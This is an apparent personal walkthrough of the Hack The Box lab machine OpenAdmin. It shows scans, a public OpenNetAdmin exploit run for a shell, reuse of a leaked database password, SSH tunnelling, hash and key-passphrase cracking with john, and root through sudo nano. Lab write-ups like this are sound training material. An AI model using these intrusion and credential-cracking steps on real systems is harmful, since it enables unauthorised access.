### Initial access
Nmap
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Dir scan
```
┌──(kali㉿kali)-[~/HTB/Precious]
└─$ ffuf -u http://$target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.40.12/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Output file      : dirs
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

music                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 123ms]
[INFO] Adding a new job to the queue: http://10.129.40.12/music/FUZZ

artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 81ms]
[INFO] Adding a new job to the queue: http://10.129.40.12/artwork/FUZZ

server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 83ms]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 104ms]
[INFO] Adding a new job to the queue: http://10.129.40.12/sierra/FUZZ

[INFO] Starting queued job on target: http://10.129.40.12/music/FUZZ

css                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 88ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/music/css/
js                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 89ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/music/js/
img                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 88ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/music/img/
Source                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 86ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/music/Source/
[INFO] Starting queued job on target: http://10.129.40.12/artwork/FUZZ

js                      [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 85ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/artwork/js/
css                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 85ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/artwork/css/
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 86ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/artwork/images/
fonts                   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 159ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/artwork/fonts/
[INFO] Starting queued job on target: http://10.129.40.12/sierra/FUZZ

css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 87ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/sierra/css/
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 88ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/sierra/js/
img                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 86ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/sierra/img/
fonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 159ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/sierra/fonts/
vendors                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 88ms]
[WARN] Directory found, but recursion depth exceeded. Ignoring: http://10.129.40.12/sierra/vendors/
:: Progress: [62282/62282] :: Job [4/4] :: 337 req/sec :: Duration: [0:02:36] :: Errors: 0 ::
                                                                                                 
```
Access music and use login to ch,e to dir `ona` we use this https://www.exploit-db.com/exploits/47691
```
┌──(kali㉿kali)-[~/HTB/OpenAdmin]
└─$ ./exp.sh http://10.129.40.12/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 

```
### Lateral Movement
Run linpeas
```bash
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled                                                                                          
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 33 Nov 22  2019 /etc/apache2/sites-enabled/openadmin.conf -> ../sites-available/openadmin.conf
<VirtualHost *:80>
        ServerName openadmin.htb
        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                              
                                                                                                                                                             
No cached sudo token (sudo -n -l)
Sudoers file: /etc/sudoers.d/joanna is readable
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv




```
We found config file
```
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

```
Now we cond switch to suer jimmy
```
www-data@openadmin:/opt/ona/www/local/config$ su jimmy              
Password: 
jimmy@openadmin:/opt/ona/www/local/config$ 

```
Cred `jimmy:n1nj4W4rri0R!`
```
┌──(kali㉿kali)-[~/HTB/OpenAdmin]
└─$ ssh -L 52846:127.0.0.1:52846 jimmy@10.129.40.12
The authenticity of host '10.129.40.12 (10.129.40.12)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.40.12' (ED25519) to the list of known hosts.
jimmy@10.129.40.12's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 16 01:56:05 UTC 2026

  System load:  0.03              Processes:             179
  Usage of /:   32.7% of 7.81GB   Users logged in:       0
  Memory usage: 20%               IP address for ens160: 10.129.40.12
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 

```

We access internal webservice to exploit, access internal and read index.php
```
            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }

```
We crack this hash
```
┌──(kali㉿kali)-[~/HTB/OpenAdmin]
└─$ echo '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1' > hash.txt

┌──(kali㉿kali)-[~/HTB/OpenAdmin]
└─$ john --format=raw-sha512 \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     --rules \
     hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 512/512 AVX512BW 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Revealed         (?)     
1g 0:00:00:01 DONE (2026-09-15 22:17) 0.7812g/s 12979Kp/s 12979Kc/s 12979KC/s Rin1990..Ramna
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   
```


![[Assets/Screenshot from 2026-09-16 09-19-48.png]]

We found id_rsa but it have pass phrase so we need to crack it
```bash
┌──(kali㉿kali)-[~/HTB/OpenAdmin]
└─$ ssh2john id_rsa > ssh.hash   
┌──(kali㉿kali)-[~/HTB/OpenAdmin]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --rules ssh.hash             
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:00:01 DONE (2026-09-15 22:22) 0.7575g/s 7253Kp/s 7253Kc/s 7253KC/s bloodofyouth..bloodmabite
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Priv escalation
Like we found in linpeas
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

```
We use GFTOBIN and pwn it
```
# idancel                                                                     M-F New Buffer
uid=0(root) gid=0(root) groups=0(root)
# 

```